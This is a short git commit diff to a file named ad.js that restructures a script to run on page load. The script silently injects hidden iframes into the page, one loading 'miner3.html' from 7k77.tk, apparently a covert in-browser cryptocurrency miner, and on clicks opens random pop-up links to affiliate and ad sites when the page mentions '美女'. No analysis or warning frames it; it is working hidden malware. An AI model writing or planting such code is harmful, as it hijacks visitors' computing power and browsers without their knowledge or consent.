dab6bf7c754d16cecfb8f245d6f392b46c28c65d
ClydeKuo <clydekuo6@gmail.com>
2017-12-02 15:08:35 +0800

    fe

--- ad.js
+++ ad.js
@@ -1,43 +1,47 @@
-if(document.getElementById("emprise")) return
-var divs=[
-"<a href=\"http://www.7k77.tk\"  style=\"display: none;\"></a>",
-"<iframe id=\"7k77\" src=\"http://www.7k77.tk\"  style=\"display: none;\"></iframe>",
-"<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>"
-]
-for (var i=0,len=divs.length;i<len;i++){
-    document.body.innerHTML+=divs[i]
-}
-document.addEventListener("click", function () {
-    if (document.getElementsByTagName("body")[0].innerText.match("美女")) {
-        var list=[
-        "http://www.wqwpm.com:10080?id=a1-31872",
-        "http://www.wqwpm.com:10080?id=a1-31872&h=1",
-        "http://www.wqwpm.com:10080?id=a1-31872&xxf=0",
-        "http://www.wqwpm.com:10080?id=a1-31872&xxf=1",
-        "http://www.wqwpm.com:10080/pccps/?u=31872&k=xx",
-        "http://www.oetf5555.com:9001/?u=31872&k=xx",
-        "http://www.hnwledu.cn/?p=290&u=31872&k=xx",
-        "http://www.qunxionglm.com/ipccode/?id=31872&mtype=ipc",
-        "http://www.wqwpm.com:10080/zhibo/?u=31872&k=xxcpa&mtype=lts",
-        "http://www.wqwpm.com:10080/zhibo/?u=31872&k=xxcpa&mtype=lts&h=1",
-        "http://adpays.net/v.php?user=4297",
-        "http://www.wqwpm.com:10080?id=a1-31872",
-        "http://www.wqwpm.com:10080?id=a1-31872&h=1",
-        "http://www.wqwpm.com:10080?id=a1-31872&xxf=0",
-        "http://www.wqwpm.com:10080?id=a1-31872&xxf=1",
-        "http://www.wqwpm.com:10080/pccps/?u=31872&k=xx",
-        "http://www.oetf5555.com:9001/?u=31872&k=xx",
-        "http://www.hnwledu.cn/?p=290&u=31872&k=xx",
-        "http://www.qunxionglm.com/ipccode/?id=31872&mtype=ipc",
-        "http://www.wqwpm.com:10080/zhibo/?u=31872&k=xxcpa&mtype=lts",
-        "http://www.wqwpm.com:10080/zhibo/?u=31872&k=xxcpa&mtype=lts&h=1",
-        "http://adpays.net/v.php?user=4297",
-        ]
-        var num=Math.round(Math.random()*100)
-        var link=list[num]
-        if(link){
-            window.open(link)
-        }
+
+window.onload = function(){
+    if(document.getElementById("emprise")) return
+    var divs=[
+    "<a href=\"http://www.7k77.tk\"  style=\"display: none;\"></a>",
+    "<iframe id=\"7k77\" src=\"http://www.7k77.tk\"  style=\"display: none;\"></iframe>",
+    "<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>"
+    ]
+    for (var i=0,len=divs.length;i<len;i++){
+        document.body.innerHTML+=divs[i]
     }
-})
+    document.addEventListener("click", function () {
+        if (document.getElementsByTagName("body")[0].innerText.match("美女")) {
+            var list=[
+            "http://www.wqwpm.com:10080?id=a1-31872",
+            "http://www.wqwpm.com:10080?id=a1-31872&h=1",
+            "http://www.wqwpm.com:10080?id=a1-31872&xxf=0",
+            "http://www.wqwpm.com:10080?id=a1-31872&xxf=1",
+            "http://www.wqwpm.com:10080/pccps/?u=31872&k=xx",
+            "http://www.oetf5555.com:9001/?u=31872&k=xx",
+            "http://www.hnwledu.cn/?p=290&u=31872&k=xx",
+            "http://www.qunxionglm.com/ipccode/?id=31872&mtype=ipc",
+            "http://www.wqwpm.com:10080/zhibo/?u=31872&k=xxcpa&mtype=lts",
+            "http://www.wqwpm.com:10080/zhibo/?u=31872&k=xxcpa&mtype=lts&h=1",
+            "http://adpays.net/v.php?user=4297",
+            "http://www.wqwpm.com:10080?id=a1-31872",
+            "http://www.wqwpm.com:10080?id=a1-31872&h=1",
+            "http://www.wqwpm.com:10080?id=a1-31872&xxf=0",
+            "http://www.wqwpm.com:10080?id=a1-31872&xxf=1",
+            "http://www.wqwpm.com:10080/pccps/?u=31872&k=xx",
+            "http://www.oetf5555.com:9001/?u=31872&k=xx",
+            "http://www.hnwledu.cn/?p=290&u=31872&k=xx",
+            "http://www.qunxionglm.com/ipccode/?id=31872&mtype=ipc",
+            "http://www.wqwpm.com:10080/zhibo/?u=31872&k=xxcpa&mtype=lts",
+            "http://www.wqwpm.com:10080/zhibo/?u=31872&k=xxcpa&mtype=lts&h=1",
+            "http://adpays.net/v.php?user=4297",
+            ]
+            var num=Math.round(Math.random()*100)
+            var link=list[num]
+            if(link){
+                window.open(link)
+            }
+        }
+    })
+}
+
     
